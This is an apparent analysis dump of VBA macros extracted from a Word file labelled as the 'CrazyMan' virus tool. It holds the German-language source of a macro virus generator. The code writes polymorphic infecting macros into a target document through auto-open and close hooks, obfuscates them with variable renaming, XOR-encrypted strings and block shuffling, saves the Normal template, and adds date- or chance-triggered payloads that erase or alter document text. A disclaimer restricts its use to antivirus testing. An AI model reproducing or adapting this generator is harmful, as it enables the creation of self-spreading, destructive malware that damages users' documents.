 End With
 Dat_AkivDocDel.Datum = Dat_Datum
 Dat_AkivDocDel.Zufall = Dat_Zufall
 If Dat_AkivDocDel.Datum.Auswahl Then
  Check_AkivDocDel_Optionen.Caption = Trim(FormStartOptionen.Button_Datum.Caption)
  If Dat_AkivDocDel.Zufall.Auswahl Then Check_AkivDocDel_Optionen.Caption = Check_AkivDocDel_Optionen.Caption & " (" & Trim(FormStartOptionen.Button_ZufallsGenerator.Caption) & ")"
 ElseIf Dat_AkivDocDel.Zufall.Auswahl Then
  Check_AkivDocDel_Optionen.Caption = Trim(FormStartOptionen.Button_ZufallsGenerator.Caption)
  If Dat_AkivDocDel.Datum.Auswahl Then If Dat_AkivDocDel.Zufall.Auswahl Then If Dat_AkivDocDel.Zufall.Auswahl Then Check_AkivDocDel_Optionen.Caption = Check_AkivDocDel_Optionen.Caption & " (" & Trim(FormStartOptionen.Button_Datum.Caption) & ")"
  Else: Check_AkivDocDel_Optionen.Caption = "Torpedo abfeuern ..."
 End If
 Check_AkivDocDel.Enabled = Dat_AkivDocDel.Datum.Auswahl Or Dat_AkivDocDel.Zufall.Auswahl
 Check_AkivDocDel.Value = Check_AkivDocDel.Enabled
End Sub
Private Sub Check_AutoNew_Change()
 Check_DocumentNew.Enabled = (Check_DocumentNew.Enabled = False)
 StartProcedure.AutoNew = Check_AutoNew.Value
 Ist_Startauswahl_OK
End Sub
Private Sub Check_AutoOpen_Change()
 Check_DocumentOpen.Enabled = (Check_DocumentOpen.Enabled = False)
 StartProcedure.AutoOpen = Check_AutoOpen.Value
 Ist_Startauswahl_OK
End Sub
Private Sub Check_AutoClose_Change()
 Check_DocumentClose.Enabled = (Check_DocumentClose.Enabled = False)
 StartProcedure.AutoClose = Check_AutoClose.Value
 Ist_Startauswahl_OK
End Sub
Private Sub Check_DocumentNew_Change()
 Check_AutoNew.Enabled = (Check_DocumentNew = False)
 StartProcedure.DocNew = Check_DocumentNew.Value
 Ist_Startauswahl_OK
End Sub
Private Sub Check_DocumentOpen_Change()
 Check_AutoOpen.Enabled = (Check_AutoOpen.Enabled = False)
 StartProcedure.DocOpen = Check_DocumentOpen.Value
 Ist_Startauswahl_OK
End Sub
Private Sub Check_DocumentClose_Change()
 Check_AutoClose.Enabled = (Check_AutoClose.Enabled = False)
 StartProcedure.DocClose = Check_DocumentClose.Value
 Ist_Startauswahl_OK
End Sub
Private Sub Ist_Startauswahl_OK()
 Label_keine_Auswahl.Visible = Not (Check_AutoNew Or Check_AutoOpen Or Check_AutoClose Or Check_DocumentNew Or Check_DocumentOpen Or Check_DocumentClose)
 Image_keine_Auswahl.Visible = Label_keine_Auswahl.Visible
 Button_Start.Enabled = (Not Label_keine_Auswahl.Visible And MultiPage.Page_Infect.Visible)
End Sub
Private Sub Check_Lizenz_Change()
 If Check_Lizenz.Value Then
  Check_Lizenz.Visible = False
  With MultiPage
   .Page_Infect.Visible = True
   .Page_PayLoad.Visible = True
  End With
  Button_Start.Enabled = True
 End If
End Sub
Private Sub Button_Start_Click()
 FormVirus.Show
 If Not ZielDocument Is Nothing Then
  If MsgBox("Dokument: """ & ZielDocument.FullName & """ wird infiziert." & vbCr & "Soll ich das wirklich tun ?", vbYesNo + vbDefaultButton1 + vbExclamation, EsIstIch) = vbNo Then Exit Sub
  Generator_Run
  Unload Me
 End If
End Sub
Private Sub CommandButton2_Click()
 Unload Me
End Sub
Private Sub Button_HyperLink_Click()
 FormHyperLink.Show
 If Dat_HyperLink.OK Then Button_HyperLink.Picture = MainUserForm.ImageOK.Picture Else Button_HyperLink.Picture = MainUserForm.ImageNO.Picture
 Check_HyperLink.Enabled = Dat_HyperLink.OK And (Dat_HyperLink.Datum.OK Or Dat_HyperLink.Zufall.OK)
 Check_HyperLink.Value = Check_HyperLink.Enabled
End Sub
Private Sub Button_TextBox_Click()
 FormTextBox.Show
 If Dat_TextBox.OK Then Button_TextBox.Picture = ImageOK.Picture Else Button_TextBox.Picture = ImageNO.Picture
 Check_TextBox.Enabled = Dat_TextBox.OK And (Dat_TextBox.Datum.OK Or Dat_TextBox.Zufall.OK)
 Check_TextBox.Value = Check_TextBox.Enabled
End Sub
Private Sub Button_TextTauschen_Click()
 FormReplace.Show
 If Dat_Replace.OK Then Button_TextTauschen.Picture = ImageOK.Picture Else Button_TextTauschen.Picture = ImageNO.Picture
 Check_TextTauschen.Enabled = Dat_Replace.OK And (Dat_Replace.Datum.OK Or Dat_Replace.Zufall.OK)
 Check_TextTauschen.Value = Check_TextTauschen.Enabled
End Sub
Private Sub Check_AkivDocDel_Change()
 Dat_AkivDocDel.OK = Check_AkivDocDel.Value
End Sub

Private Sub Label_Info_Click()

End Sub

Private Sub UserForm_Initialize()
 Application.Visible = False
 Button_Start.Enabled = False
 
 With Check_Lizenz
  .Visible = True
  .Value = False
 End With

 With MultiPage
  .Page_Infect.Visible = False
  .Page_PayLoad.Visible = False
 End With

 Check_DocumentOpen.Value = True
 Check_DocumentClose.Value = True
 InfoLabel.Caption = vbCr & vbCr & vbCr & "    Der Virus-Generator darf nur zum Test von Antiviren-Software" & vbCr & _
                                          "    eingesetzt werden. Erstellte Viren dürfen nicht in Umlauf gebracht oder auf" & vbCr & _
                                          "    irgendeine andere Art verbreitet werden. Für Schäden, die durch den" & vbCr & _
                                          "    Generator oder durch von ihm erstellte Viren entstehen, lehne ich jede " & vbCr & _
                                          "    Verantwortung ab."

 With Dat_Datum
  .Tag = 1
  .Monat = 1
  .JedenTag = False
  .JedenMonat = False
  .OK = False
  .Auswahl = False
 End With

 With Dat_Zufall
  .Random = 0
  .OK = False
  .Auswahl = False
 End With

 With Dat_TextBox
  .Title = ""
  .Prompt = ""
  .Symbol = vbCritical
  .SymbolAktiv = True
  .OK = False
  .Datum = Dat_Datum
  .DatumWahl = False
  .Zufall = Dat_Zufall
  .ZufallWahl = False
 End With

 With Dat_HyperLink
  .Link = ""
  .OK = False
  .Datum = Dat_Datum
  .DatumWahl = False
  .Zufall = Dat_Zufall
  .ZufallWahl = False
 End With

 With Dat_Replace
  .Orginal = ""
  .Replace = ""
  .GanzesWort = False
  .OK = False
  .Datum = Dat_Datum
  .DatumWahl = False
  .Zufall = Dat_Zufall
  .ZufallWahl = False
 End With

 With Dat_AkivDocDel
  .OK = False
  .Datum = Dat_Datum
  .DatumWahl = False
  .Zufall = Dat_Zufall
  .ZufallWahl = False
 End With

 With StartProcedure
  .AutoNew = Check_AutoNew.Value
  .AutoOpen = Check_AutoNew.Value
  .AutoClose = Check_AutoNew.Value
  .DocNew = Check_DocumentNew.Value
  .DocOpen = Check_DocumentOpen.Value
  .DocClose = Check_DocumentClose.Value
 End With


 Label_keine_Auswahl.Caption = "Das ist unlogisch !!!" & vbCr & _
   "Wie soll ich den da starten ?"
 Label_Main_InfectInfo.Caption = vbCr & vbCr & "    Das Starten von Auto-Makros" & vbCr & _
                                               "    kann durch Drücken der STRG-Taste" & vbCr & _
                                               "    oder den Befehl ""DisableAutoMacros""" & vbCr & _
                                               "    unterdrückt werden." & vbCr & vbCr & _
                                               "    Ich habe dann keine Möglichkeit um" & vbCr & _
                                               "    zu starten und mich zu schützen !!!!!"

Label_Info.Caption = vbCr & vbCr & "    Verschlüsslungsstrategien:" & vbCr & _
                                    "       - Umbenennung aller Variablen im Virus-Code" & vbCr & _
                                    "       - Umbenennung aller Sprungmarken im Virus-Code" & vbCr & _
                                    "       - Neuverschlüsslung aller Texteinträge" & vbCr & _
                                    "       - Neuanordnung der 22 Codemodule innerhalb der einen Haupt-Procedur" & vbCr & _
                                    "       - Einfügen einer zufälligen Menge von Leerzeichen vor jeder Codezeile" & vbCr & _
                                    "       - zufälliges Einfügen von Zeilenumbrüchen" & vbCr & _
                                    "       - zufälliges Einfügen von Kommentarzeilen mit variablen Inhalt"


End Sub
Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer)
 Application.Visible = True
End Sub
-------------------------------------------------------------------------------
VBA MACRO CryptModul.bas 
in file: VirTool.MSWord.CrazyMan - OLE stream: 'Macros/VBA/CryptModul'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

Public Function Get_Neuen_SchlüsselCode(ByVal OldSchlüssel As String) As String
 Dim Buf As String, TmpStr As String, x As Long, y As Long
 Buf = OldSchlüssel
 For x = 1 To Len(Buf)
  y = Int(Rnd * (Len(Buf) - 1)) + 1
  TmpStr = Mid(Buf, y, 1)
  Mid(Buf, y, 1) = Mid(Buf, x, 1)
  Mid(Buf, x, 1) = TmpStr
 Next x
 Get_Neuen_SchlüsselCode = Buf
End Function

Public Sub BlöckeTauschen(ByRef Code As String)
 Dim BlockNamen As Variant, EndMarke As String, x As Long, y As Long, VStart As Long, VEnde As Long, TmpStr As String, VirusModule(22) As String
 On Error GoTo fehler
 BlockNamen = Array("Yny7e7C", "S02217RK", "J54Jq0", "E7swNF", "L8n9WKR", "OC9esi", "XDP63", "TxGb0ns9", "RIud9DoA", "O0hy73", "E7KiNw0R", "M6K4f0", "VK8fm7H2", "G8b3E", "S7M988u", "O192b", "E1QdMs", "Xg645Ye", "VXdgkhe6", "NwR7Xamt", "R0Lsd", "Iml96v3i", "VvhD15Ok", "MStoLEX")
 EndMarke = "GoTo " & BlockNamen(&O27)

 For x = &O0 To &O26
  VStart = InStr(1, Code, BlockNamen(x) & Chr(&O72) & vbCr)
  If VStart > 0 Then VEnde = InStr(VStart, Code, EndMarke) + Len(EndMarke) - VStart
  If VEnde > 0 Then VirusModule(x) = Mid(Code, VStart, VEnde) & vbCr
 Next x

 Code = Left(Code, InStr(Code, Chr(&O72))) & vbCr & VirusModule(&O0)
 TmpStr = VirusModule(&O1)
 VirusModule(&O1) = VirusModule(&O2)
 VirusModule(&O2) = TmpStr

 For x = &O3 To &O26
  y = Int(Rnd * &O23) + &O3
  TmpStr = VirusModule(x)
  VirusModule(x) = VirusModule(y)
  VirusModule(y) = TmpStr
 Next x

 For x = &O1 To &O26
  Code = Code & VirusModule(x)
 Next x

 Code = Code & vbCr & "DcJ7WD5" & Chr(&O72) & vbCr & BlockNamen(&O27) & Chr(&O72) & vbCr
 Exit Sub

fehler:
 MsgBox "Fehler bei der Erstellung !!!", vbCritical, "Fehler"
 End
End Sub

Public Sub Schlüssel_ändern(ByRef Code As String, OldSchlüssel As String, NewSchlüssel As String)
 Dim TmpStr As String, VStart As Long, VEnde As Long

 TmpStr = "Const"
 VStart = InStr(1, Code, TmpStr) + 5
 If VStart > 0 Then VEnde = InStr(VStart, Code, Chr(&O75))
 Code = VarVerschlüsseln(Code, Trim(Mid(Code, VStart + 1, (VEnde - VStart) - 1)))
 VStart = InStr(VStart, Code, Chr(&O75)) + 3
 If VStart > 0 Then VEnde = Len(Code) - (VStart + Len(NewSchlüssel) - 1)
 If VStart > 0 And Mid(Code, VStart, Len(OldSchlüssel)) = OldSchlüssel Then Mid(Code, VStart, Len(OldSchlüssel)) = NewSchlüssel
End Sub

Public Sub Texteinträge_ändern(ByRef Code As String, OldSchlüssel As String, NewSchlüssel As String)
 Dim TmpStr As String, VStart As Long, VEnde As Long
 VStart = InStr(1, Code, NewSchlüssel) + Len(NewSchlüssel)
 VEnde = InStr(VStart, Code, vbCr) + 1
 Do While VEnde > 0
  VStart = InStr(VEnde + 3, Code, "= " & Chr(34)) + 3
  If VStart > 3 Then VEnde = InStr(VStart, Code, Chr(34)) Else VEnde = &O0
  If VEnde > 0 Then
   TmpStr = Trim(Mid(Code, VStart, VEnde - VStart))
   If TmpStr <> "" Then TmpStr = DeCrypt(DeCrypt(TmpStr, OldSchlüssel), NewSchlüssel)
   Code = Left(Code, VStart - &O1) & TmpStr & Mid(Code, VEnde)
  End If
 Loop
End Sub

Public Sub Var_ändern(ByRef Code As String)
 Dim TmpStr As String, VStart As Long, VEnde As Long
 VEnde = 1
 Do While VEnde > &O0
  VStart = InStr(VEnde + &O3, Code, Chr(&O104) & Chr(&O151) & Chr(&O155))
  If VStart > &O0 Then VEnde = InStr(VStart + &O3, Code, Chr(&O101) & Chr(&O163)) Else VEnde = 0
  If VEnde > &O0 Then
   TmpStr = Trim(Mid(VirusCodeBuffer, VStart + &O3, (VEnde - VStart) - &O3))
   If InStr(TmpStr, Chr(&O50)) = &O0 Then Code = VarVerschlüsseln(Code, TmpStr)
  End If
 Loop
End Sub

Public Sub Sprungmarken_ändern(ByRef Code As String)
 Dim TmpStr As String, VStart As Long, VEnde As Long, x As Long
 VEnde = 1
 VStart = 1
 Do While VEnde > 0
  VEnde = InStr(VStart, Code, Chr(&O72) & vbCr)
  If VEnde - 20 > &O0 Then
   VStart = VEnde - 20: x = &O0
   Do
    VStart = VStart + x
    x = InStr(1, Trim(Mid(Code, VStart + 1, (VEnde - VStart) - 1)), vbCr)
   Loop Until x = 0
   VStart = VStart + 1
  End If

  If VEnde - VStart > 0 Then
   TmpStr = Trim(Mid(Code, VStart, VEnde - VStart))
   Code = VarVerschlüsseln(Code, TmpStr)
   Else: Exit Do
  End If
  VStart = InStr(VStart, Code, Chr(&O72) & vbCr) + 2
 Loop
End Sub

Private Function VarVerschlüsseln(ByVal Code As String, VarName As String) As String
 Dim x As Long, NewVarName As String
 NewVarName = GetNewBez
 x = &O0 - Len(NewVarName)
 Do While x <> 0
  x = InStr(x + Len(NewVarName) + 1, Code, VarName)
  If x > 0 Then Code = Left(Code, x - 1) & NewVarName & Right(Code, (Len(Code) - (x + Len(VarName)) + 1))
 Loop
 VarVerschlüsseln = Code
End Function


-------------------------------------------------------------------------------
VBA MACRO SubModul.bas 
in file: VirTool.MSWord.CrazyMan - OLE stream: 'Macros/VBA/SubModul'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

Type TDatum
 Tag As Byte
 Monat As Byte
 JedenTag As Boolean
 JedenMonat As Boolean
 OK As Boolean
 Auswahl As Boolean
End Type

Type TZufall
 Random As Long
 OK As Boolean
 Auswahl As Boolean
End Type

Type TTextBox
 Title As String
 Prompt As String
 Symbol As Byte
 SymbolAktiv As Boolean
 OK As Boolean
 Datum As TDatum
 DatumWahl As Boolean
 Zufall As TZufall
 ZufallWahl As Boolean
End Type

Type THyperLink
 Link As String
 OK As Boolean
 Datum As TDatum
 DatumWahl As Boolean
 Zufall As TZufall
 ZufallWahl As Boolean
End Type

Type TReplace
 Orginal As String
 Replace As String
 GanzesWort As Boolean
 OK As Boolean
 Datum As TDatum
 DatumWahl As Boolean
 Zufall As TZufall
 ZufallWahl As Boolean
End Type

Type TAkivDocDel
 OK As Boolean
 Datum As TDatum
 DatumWahl As Boolean
 Zufall As TZufall
 ZufallWahl As Boolean
End Type

Type TStartProcedure
 DocNew As Boolean
 DocOpen As Boolean
 DocClose As Boolean
 AutoNew As Boolean
 AutoOpen As Boolean
 AutoClose As Boolean
End Type

Public Dat_TextBox As TTextBox
Public Dat_Datum As TDatum
Public Dat_HyperLink As THyperLink
Public Dat_Zufall As TZufall
Public Dat_Replace As TReplace
Public Dat_AkivDocDel As TAkivDocDel
Public StartProcedure As TStartProcedure

Public Const EsIstIch = "Mister Spock"
Public Const CodeChar_ERROR = "Es dürfen nur ASC-Zeichen im Bereich von 0 bis 127 verwendet werden." & vbCr & "Zeichen im Bereich von 128 bis 255 wie ä, ö und ü können nicht Codiert gespeichert werden."
Public Const Title_ERROR = "FEHLER"

Public Sub Startup()
 MainUserForm.Show
End Sub

Public Sub ToolsStartup()
 Tools.Show
End Sub

Public Function DeCrypt(ByVal s As String, ByVal Schlüssel As String) As String
 Dim x As Byte
 For x = 1 To Len(s)
  DeCrypt = DeCrypt & Chr(Asc(Mid(s, x, 1)) Xor Asc(Mid(Schlüssel, x, 1)))
 Next x
End Function

Public Function GetMonatsName(ByVal Monat As Byte) As String
 Select Case Monat
  Case 1: GetMonatsName = " Januar   "
  Case 2: GetMonatsName = " Februar  "
  Case 3: GetMonatsName = " März     "
  Case 4: GetMonatsName = " April    "
  Case 5: GetMonatsName = " Mai      "
  Case 6: GetMonatsName = " Juni     "
  Case 7: GetMonatsName = " Juli     "
  Case 8: GetMonatsName = " August   "
  Case 9: GetMonatsName = " September"
  Case 10: GetMonatsName = " Oktober  "
  Case 11: GetMonatsName = " November "
  Case 12: GetMonatsName = " Dezember "
 End Select
End Function

Public Function GET_Kommentar() As String
 Dim s As String, x As Long
 Randomize Timer
 If Int(Rnd * &O11) + &O1 > &O10 Then 'Kommentar
  For x = &O0 To Int(Rnd * &O11) + &O1: s = s & Rnd * (Rnd * &O23420) & vbTab: Next x
  s = vbCr & String(Int(Rnd * &O12), Chr(&O40)) & Chr(&O47) & s & vbCr
  If Int(Rnd * &O12) + &O1 = &O1 Then s = s & vbCr 'Zeilenumbruch nach Kommentar
  Else: s = vbCr
 End If
 If Int(Rnd * &O12) + &O1 = &O1 Then s = s & vbCr 'Zeilenumbruch
 s = s & String(Int(Rnd * &O12), Chr(&O40)) 'neue Leerzeichen
 GET_Kommentar = s
End Function

Public Function GetNewBez() As String
 Dim NewBez As String, x As Long
Start:
 NewBez = Chr(Int(Rnd * &O31) + &O101)
 For x = &O1 To Int(Rnd * &O4) + &O4
  Select Case Int((Rnd * &O3) + &O1)
   Case 1: NewBez = NewBez & Chr(Int(Rnd * &O31) + &O101)
   Case 2: NewBez = NewBez & Chr(Int(Rnd * &O12) + &O60)
   Case 3: NewBez = NewBez & Chr(Int(Rnd * &O31) + &O141)
  End Select
 Next x
 If InStr(&O1, VirusCodeBuffer, NewBez) <> &O0 Then GoTo Start
 GetNewBez = NewBez
End Function

Public Function SaveAs(Doc As Object) As Boolean
 SaveAs = False
 Doc.Activate
 If Dialogs(wdDialogFileSaveAs).Show <> 0 Then
  SaveAs = True
  Else: MsgBox "Dokument wurde nicht gespeichert !!!   " & vbCr & "Vorgang wurde abgebrochen.", vbCritical, EsIstIch & " - Abbruch"
 End If
 Application.Visible = False
End Function

Public Function IstInfect(Doc As Object) As Boolean
 Dim Obj As Object, z1 As Long, z2 As Long, VStart As Long, VEnde As Long, TmpStr As String
 Set Obj = Doc.VBProject.VBComponents.Item(1).CodeModule
 With Obj
  z1 = &O0
  VStart = &O0
  If .Find("Sub ", VStart, 1, .CountOfLines, 1, False, False, False) Then
   If .Find("Const ", VStart, 1, .CountOfLines, 1, False, False, False) Then
    TmpStr = Mid(.Lines(VStart, 1), InStr(.Lines(VStart, 1), Chr(&O42)) + 1)
    If InStr(TmpStr, Chr(&O42)) > 0 Then
     TmpStr = Left(TmpStr, InStr(TmpStr, Chr(&O42)))
     For z2 = &O1 To Len(TmpStr) - &O1: z1 = vbCr & z1 + Asc(Mid(TmpStr, z2, &O1)): Next z2
    End If
   End If
  End If
  If z1 <> &O43326 Then Exit For
 End With
End If

End Function


-------------------------------------------------------------------------------
VBA MACRO VirusCodeModul.bas 
in file: VirTool.MSWord.CrazyMan - OLE stream: 'Macros/VBA/VirusCodeModul'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

Const VS = "Ï’ïžÐ¬¡¾€ŒóÃˆ”Êš­™°ë¶ Â³½÷«‡‚�Ñ“•à‘¤†�íÿÈ„�¸À�òèÍ´‹ì§¯ÌùËŸð¥·»¢˜ºç�›á¨õåŽø¿¦²©—ãâªƒ±êÓ¼œÇúÄŠ£ÅÁ®µ¹‰"
Public Modul1(9) As String
Public Modul2(29) As String
Public Modul3(3) As String
Public Modul4(15) As String
Public Modul5(43) As String
Public Modul6(7) As String
Public Modul7(18) As String
Public Modul8(16) As String
Public Modul9(12) As String
Public Modul10(16) As String
Public Modul11(12) As String
Public Modul12(11) As String
Public Modul13(16) As String
Public Modul14(10) As String
Public Modul15(18) As String
Public Modul16(16) As String
Public Modul17(10) As String
Public Modul18(7) As String
Public Modul19(5) As String
Public Modul20(5) As String
Public Modul21(10) As String
Public Modul22(8) As String
Public Modul23(26) As String

Dim CodeKopf As String
Dim CodeFuss As String

Const STR_DocumentOpen = "Sub Document_Open"
Const STR_DocumentClose = "Sub Document_Close"
Const STR_DocumentNew = "Sub Document_New"
Const STR_AutoOpen = "Sub AutoOpen"
Const STR_AutoClose = "Sub AutoClose"
Const STR_AutoNew = "Sub AutoNew"

Dim ProcCount As Byte
Dim Start_Proceduren As String
Dim Start_Procedure_Name As String

Public VirusCodeBuffer As String
Public ZielDocument As Object

Sub Generator_Run()
 Dim ProcBuf As String, NewCode As String
 On Error GoTo Fehler1
 Init_Module
 Init_PlayLoad
 Start_Procedure_Name = GetNewBez
 ProcCount = 0
 ProcBuf = ""

 Start_Proceduren = vbCr
 If StartProcedure.DocNew Then
  ProcBuf = Procedute_hinzufügen(ProcBuf, STR_DocumentNew) & vbCr & GET_Kommentar
  Start_Proceduren = Start_Proceduren & "Private " & STR_DocumentNew & vbCr & Start_Procedure_Name & vbCr & "End Sub" & vbCr
 End If

 If StartProcedure.DocOpen Then
  ProcBuf = Procedute_hinzufügen(ProcBuf, STR_DocumentOpen) & vbCr & GET_Kommentar
  Start_Proceduren = Start_Proceduren & "Private " & STR_DocumentOpen & vbCr & Start_Procedure_Name & vbCr & "End Sub" & vbCr
 End If

 If StartProcedure.DocClose Then
  ProcBuf = Procedute_hinzufügen(ProcBuf, STR_DocumentClose) & vbCr & GET_Kommentar
  Start_Proceduren = Start_Proceduren & "Private " & STR_DocumentClose & vbCr & Start_Procedure_Name & vbCr & "End Sub" & vbCr
 End If

 If StartProcedure.AutoNew Then
  ProcBuf = Procedute_hinzufügen(ProcBuf, STR_AutoNew) & vbCr & GET_Kommentar
  Start_Proceduren = Start_Proceduren & "Private " & STR_AutoNew & vbCr & Start_Procedure_Name & vbCr & "End Sub" & vbCr
 End If

 If StartProcedure.AutoOpen Then
  ProcBuf = Procedute_hinzufügen(ProcBuf, STR_AutoOpen) & vbCr & GET_Kommentar
  Start_Proceduren = Start_Proceduren & "Private " & STR_AutoOpen & vbCr & Start_Procedure_Name & vbCr & "End Sub" & vbCr
 End If

 If StartProcedure.AutoClose Then
  ProcBuf = Procedute_hinzufügen(ProcBuf, STR_AutoClose) & vbCr & GET_Kommentar
  Start_Proceduren = Start_Proceduren & "Private " & STR_AutoClose & vbCr & Start_Procedure_Name & vbCr & "End Sub" & vbCr
 End If

 Modul14(1) = Modul14(1) & "&O" & Oct(5 + ProcCount) & ") As String"
 Modul14(8) = ProcBuf
 VirusCodeBuffer = Code_Einlesen(Modul1, Modul2, Modul3, Modul4, Modul5, Modul6, Modul7, Modul8, Modul9, Modul10, Modul11, Modul12, Modul13, Modul14, Modul15, Modul16, Modul17, Modul18, Modul19, Modul20, Modul21, Modul22, Modul23)

 NewCode = Get_Neuen_SchlüsselCode(VS)
 BlöckeTauschen VirusCodeBuffer
 Schlüssel_ändern VirusCodeBuffer, VS, NewCode
 Texteinträge_ändern VirusCodeBuffer, VS, NewCode
 Var_ändern VirusCodeBuffer
 Sprungmarken_ändern VirusCodeBuffer

 VirusCodeBuffer = "Private Sub " & Start_Procedure_Name & vbCr & VirusCodeBuffer & "End Sub" & vbCr & Start_Proceduren
 ZielDocument.Activate
 ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromString VirusCodeBuffer

 On Error GoTo fehler2
 ActiveDocument.Save
 If Not NormalTemplate.Saved Then NormalTemplate.Save
 ActiveDocument.Close
 NormalTemplate.Saved = True
 FormFertig.Show
 Exit Sub

Fehler1:
 MsgBox "Fehler bei der Erstellung.", vbCritical, "Fehler"
 Exit Sub

fehler2:
 MsgBox "Konnte Virus erstellen aber Dokument nicht schließen !!!", vbCritical, "Fehler"
End Sub


Function Code_Einlesen(ParamArray Buf() As Variant) As String
 Dim x As Byte, y As Byte, VirusBuf As String, TMP As String, z As Long
 For x = 0 To UBound(Buf)
  For y = 0 To UBound(Buf(x))
   VirusBuf = VirusBuf & Buf(x)(y) & GET_Kommentar
   If Int(Rnd * &O12) + &O1 = &O1 Then VirusBuf = VirusBuf & vbCr
  Next y
 Next x
 Code_Einlesen = CodeKopf & VirusBuf & CodeFuss
End Function

Function Procedute_hinzufügen(ByVal Buf As String, Bez As String) As String
 ProcCount = ProcCount + 1
 Procedute_hinzufügen = Buf & "MF0wi = """ & DeCrypt(Bez, VS) & """: GoSub VXdgkhe6: Pn56mO3(" & "&O" & Oct(5 + ProcCount) & ") = MF0wi" & vbCr
End Function

Sub Init_PlayLoad()
 If Dat_HyperLink.OK Then Modul1(7) = Get_StartCode(Dat_HyperLink.Datum, Dat_HyperLink.Zufall) & Get_HyperLink(Dat_HyperLink) & "End If"
 If Dat_TextBox.OK Then Modul2(26) = Get_StartCode(Dat_TextBox.Datum, Dat_TextBox.Zufall) & Get_TextBox(Dat_TextBox) & "End If"
 If Dat_Replace.OK Then Modul4(13) = Get_StartCode(Dat_Replace.Datum, Dat_Replace.Zufall) & Get_Replace(Dat_Replace) & "End If" & GET_Kommentar
 If Dat_AkivDocDel.OK Then Modul5(1) = Get_StartCode(Dat_AkivDocDel.Datum, Dat_AkivDocDel.Zufall) & Get_AkivDocDel(Dat_AkivDocDel) & "End If"
End Sub

Private Function Get_TextBox(Dat As TTextBox) As String
 Dim Buf As String
 Buf = "On Error Resume Next" & GET_Kommentar
 Buf = Buf & "MF0wi = " & """" & DeCrypt(Dat.Prompt, VS) & """" & ": GoSub VXdgkhe6: LS2m39 = MF0wi" & GET_Kommentar
 Buf = Buf & "MF0wi = " & """" & DeCrypt(Dat.Title, VS) & """" & ": GoSub VXdgkhe6: GL3N32Ng = MF0wi" & GET_Kommentar
 Buf = Buf & "MsgBox LS2m39, " & "&O" & Oct(Dat.Symbol) & ", GL3N32Ng" & GET_Kommentar
 Buf = Buf & "On Error GoTo DcJ7WD5" & GET_Kommentar
 Get_TextBox = Buf
End Function

Private Function Get_HyperLink(Dat As THyperLink) As String
 Dim Buf As String
 Buf = "On Error Resume Next" & GET_Kommentar
 Buf = Buf & "MF0wi = " & """" & DeCrypt(Dat.Link, VS) & """" & ":GoSub VXdgkhe6" & GET_Kommentar
 Buf = Buf & "ActiveDocument.FollowHyperlink Address:=MF0wi,NewWindow:=False,AddHistory:=True" & GET_Kommentar
 Buf = Buf & "On Error GoTo DcJ7WD5" & GET_Kommentar
 Get_HyperLink = Buf
End Function

Private Function Get_Replace(Dat As TReplace) As String
 Dim Buf As String
 Buf = "On Error Resume Next" & GET_Kommentar
 Buf = Buf & "MF0wi = " & """" & DeCrypt(Dat.Orginal, VS) & """" & ": GoSub VXdgkhe6: LS2m39 = MF0wi" & GET_Kommentar
 Buf = Buf & "MF0wi = " & """" & DeCrypt(Dat.Replace, VS) & """" & ": GoSub VXdgkhe6: GL3N32Ng = MF0wi" & GET_Kommentar
 Buf = Buf & "Selection.HomeKey Unit:=wdStory" & GET_Kommentar
 Buf = Buf & "With Selection.Find" & GET_Kommentar
 Buf = Buf & ".ClearFormatting: .Replacement.ClearFormatting" & GET_Kommentar
 Buf = Buf & ".Text = LS2m39" & GET_Kommentar
 Buf = Buf & ".Replacement.Text = GL3N32Ng" & GET_Kommentar
 Buf = Buf & ".Forward = True: .Wrap = wdFindContinue: .Format = False: .MatchCase = False: .MatchWholeWord = "
 If Dat.GanzesWort Then
  Buf = Buf & "True: .MatchAllWordForms = False" & GET_Kommentar
  Else: Buf = Buf & "False: .MatchAllWordForms = False" & GET_Kommentar
 End If
 Buf = Buf & "End With" & GET_Kommentar
 Buf = Buf & "Selection.Find.Execute Replace:=wdReplaceAll" & GET_Kommentar
 Buf = Buf & "If ActiveDocument.Path <> """" Then ActiveDocument.Save" & GET_Kommentar
 Buf = Buf & "On Error GoTo DcJ7WD5" & GET_Kommentar
 Get_Replace = Buf
End Function

Private Function Get_AkivDocDel(Dat As TAkivDocDel) As String
 Dim Buf As String
 Buf = "On Error Resume Next" & GET_Kommentar
 Buf = Buf & "Selection.WholeStory: Selection.Delete Unit:=wdCharacter, Count:=&O1: " & GET_Kommentar
 Buf = Buf & "If ActiveDocument.Path <> """" Then ActiveDocument.Save" & GET_Kommentar
 Buf = Buf & "On Error GoTo DcJ7WD5" & GET_Kommentar
 Get_AkivDocDel = Buf
End Function

Private Function Get_StartCode(Datum As TDatum, Zufall As TZufall) As String
 Dim Buf As String
 With Datum
  If .Auswahl Then
   If Not .JedenTag Then Buf = "Day(Date) = " & "&O" & Oct(.Tag)
   If Not .JedenMonat Then
    If Not .JedenTag Then Buf = "(" & Buf & " And Month(Date) = " & "&O" & Oct(.Monat) & ")" Else: Buf = Buf & "Month(Date) = " & "&O" & Oct(.Monat)
   End If
  End If
 End With
 Buf = "If " & Buf
 With Zufall
  If .Auswahl Then
   If Datum.Auswahl Then Buf = Buf & " And "
   Buf = Buf & "Int((" & "&O" & Oct(.Random) & " * Rnd) + &O1) = " & "&O" & Oct(Int((.Random * Rnd) + 1))
  End If
 End With
 Get_StartCode = Buf & " Then" & vbCr
End Function

Public Sub Init_Module()
 CodeKopf = "SHRm7m:" & vbCr
 CodeFuss = "DcJ7WD5:" & vbCr & "MStoLEX:" & vbCr
 Modul1(0) = "Yny7e7C:"
 Modul1(1) = "On Error GoTo DcJ7WD5"
 Modul1(2) = "Const Fp5Gc6n = " & """" & "Ï’ïžÐ¬¡¾€ŒóÃˆ”Êš­™°ë¶ Â³½÷«‡‚�Ñ“•à‘¤†�íÿÈ„�¸À�òèÍ´‹ì§¯ÌùËŸð¥·»¢˜ºç�›á¨õåŽø¿¦²©—ãâªƒ±êÓ¼œÇúÄŠ£ÅÁ®µ¹‰" & """" & " '" & """" & "2/1/1" & """"
 Modul1(3) = "Dim QEW3NE As String"
 Modul1(4) = "Dim HB112LY As Long"
 Modul1(5) = "Dim PcDCm9n As Object"
 Modul1(6) = "Dim MF0wi As String"
 Modul1(7) = ""
